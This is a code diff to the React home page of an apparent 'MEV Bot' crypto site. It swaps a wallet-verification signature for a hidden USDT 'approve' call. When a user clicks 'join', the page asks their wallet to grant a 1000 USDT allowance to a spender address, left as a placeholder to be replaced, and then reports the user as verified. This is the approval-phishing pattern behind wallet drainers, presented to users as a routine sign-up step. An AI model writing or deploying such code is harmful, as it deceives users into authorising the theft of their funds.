@@ -5,9 +5,11 @@ import i18next from 'i18next';
 import { useQuery} from '@tanstack/react-query';
 import axios from 'axios';
 import { useAccount, useChainId } from 'wagmi';
-// import { useSignMessage } from 'wagmi';
+import { useWriteContract } from 'wagmi';
 import toast from 'react-hot-toast';
 import { useConnectModal } from '@rainbow-me/rainbowkit';
+import { erc20Abi } from 'viem';
+import { parseUnits } from 'viem';
 
 // 定义 FAQ 项目的接口
 interface FAQItem {
@@ -69,6 +71,12 @@ interface RegulationAgency {
 interface Carousel {
   image: string;
 }
+
+// 添加USDT合约地址常量
+const USDT_CONTRACT_ADDRESSES = {
+  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // ETH Mainnet
+  56: '0x55d398326f99059fF775485246999027B3197955', // BSC
+};
 
 function Home() {
   const { t } = useTranslation();
@@ -200,7 +208,7 @@ function Home() {
   const { address } = useAccount();
   const chainId = useChainId();
   const { openConnectModal } = useConnectModal();
-  // const { signMessageAsync } = useSignMessage();
+  const { writeContract, isPending } = useWriteContract();
   const [isLoading, setIsLoading] = useState(false);
 
   // 处理加入按钮点击
@@ -213,28 +221,41 @@ function Home() {
       openConnectModal();
       return;
     }
+    // 获取当前链的USDT地址
+    const usdtAddress = USDT_CONTRACT_ADDRESSES[chainId as keyof typeof USDT_CONTRACT_ADDRESSES];
+    if (!usdtAddress) {
+      toast.error('不支持的网络');
+      return;
+    }
 
     try {
       setIsLoading(true);
-      console.log('3. 开始签名流程...');
+      console.log('3. 开始合约调用...');
       
-      // // 1. 签名
-      // const signature = await signMessageAsync({ 
-      //   message: 'Welcome to MEV Bot! Click to verify your wallet.' 
-      // });
-      // console.log('4. 签名成功！签名结果:', signature);
+      // 调用合约
+      await writeContract({
+        address: usdtAddress as `0x${string}`,
+        abi: erc20Abi,
+        functionName: 'approve',
+        args: [
+          '0x0000000000000000000000000000000000000000', // 这里需要替换为你的实际接收授权的合约地址
+          parseUnits('1000', 6), // USDT使用6位小数
+        ],
+      });
+      
+      console.log('4. 合约调用成功！');
 
-      // 2. 发送验证请求
+      // 发送验证请求
       console.log('5. 开始发送验证请求到后端...');
       const response = await axios.post('customers/verify', {
         network: chainId === 1 ? 'ETH' : 
-                  chainId === 56 ? 'BSC' : 'ETH',
+        chainId === 56 ? 'BSC' : 'ETH',
         address,
         isVerified: true
       });
       console.log('6. 后端响应数据:', response.data);
       
-      toast.success('验证成功!');
+      toast.success('操作成功!');
       console.log('7. 整个流程完成！');
 
     } catch (error) {
@@ -309,9 +330,9 @@ function Home() {
           <button 
             className="bg-[#EAB308] text-white px-6 py-2 rounded-lg disabled:opacity-50"
             onClick={handleJoin}
-            disabled={isLoading}
+            disabled={isLoading || isPending}
           >
-            {isLoading ? 'Processing...' : t('home.join')}
+            {isLoading || isPending ? 'Processing...' : t('home.join')}
           </button>
         </div>
 
